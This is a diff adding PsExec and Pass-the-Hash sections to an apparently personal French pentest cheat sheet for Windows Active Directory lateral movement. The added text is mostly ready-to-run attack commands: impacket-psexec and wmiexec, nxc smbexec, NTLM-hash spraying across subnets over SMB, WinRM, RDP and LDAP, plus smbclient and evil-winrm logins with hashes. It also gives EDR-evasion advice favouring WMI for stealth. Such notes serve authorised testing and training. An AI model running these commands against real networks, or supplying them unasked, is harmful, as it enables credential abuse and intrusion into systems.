@@ -48,3 +48,79 @@ nxc winrm <IP_CIBLE> -u <user> -p <password> -X "whoami"
 
 > WinRM souffre du **Kerberos Double Hop** — les credentials ne se propagent pas aux ressources réseau distantes depuis la session. Préférer WMI pour éviter ce problème.
 
+## PsExec
+
+Protocole : **SMB uniquement, port 445**. Nécessite admin local sur la cible + partage ADMIN$ accessible.
+
+Fonctionnement : copie un binaire service (`PSEXESVC.exe`) sur ADMIN$, le démarre via le SCM (Service Control Manager), puis communique via un named pipe dédié.
+
+> Très bruyant : écrit sur le disque, crée un service — détecté par presque tous les EDR. Préférer WMI pour la discrétion.
+
+**impacket-psexec (depuis Kali)**
+
+```bash
+impacket-psexec corp.com/<user>:<password>@<IP_CIBLE>
+```
+
+**nxc avec smbexec (équivalent psexec via nxc)**
+
+```bash
+# smbexec = crée un service pour exécuter la commande, tout via SMB (port 445 uniquement)
+nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
+```
+
+> nxc tente les méthodes dans cet ordre si aucune n'est forcée : `wmiexec` → `atexec` → `smbexec`
+
+**PsExec64.exe Windows — [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)**
+
+```cmd
+.\PsExec64.exe -i \\<HOSTNAME> -u corp\<user> -p <password> cmd
+```
+
+## Pass the Hash (PtH)
+
+Authentification avec le hash NTLM directement, sans le mot de passe en clair. Fonctionne uniquement avec **NTLM** — pas avec Kerberos.
+
+> Limitation : depuis le patch 2014, PtH ne fonctionne qu'avec le compte **Administrator local intégré** (RID 500) et les comptes de domaine. Les autres comptes admin locaux sont bloqués par défaut.
+
+**nxc — spray sur un subnet (valide pour SMB, WinRM, RDP, LDAP)**
+
+```bash
+# SMB — identifier les machines où le hash est valide (Pwn3d! = admin local)
+nxc smb <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+
+# WinRM
+nxc winrm <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+
+# RDP
+nxc rdp <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+
+# LDAP
+nxc ldap <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+
+# Exécuter une commande
+nxc smb <IP_CIBLE> -u Administrator -H '<NTLM_HASH>' -x "whoami"
+```
+
+**impacket**
+
+```bash
+# shell via WMI
+impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@<IP_CIBLE>
+
+# shell via PsExec (crée un service)
+impacket-psexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@<IP_CIBLE>
+```
+
+**smbclient — accéder à un partage**
+
+```bash
+smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash <NTLM_HASH>
+```
+
+**evil-winrm**
+
+```bash
+evil-winrm -i <IP_CIBLE> -u Administrator -H '<NTLM_HASH>'
+```
+
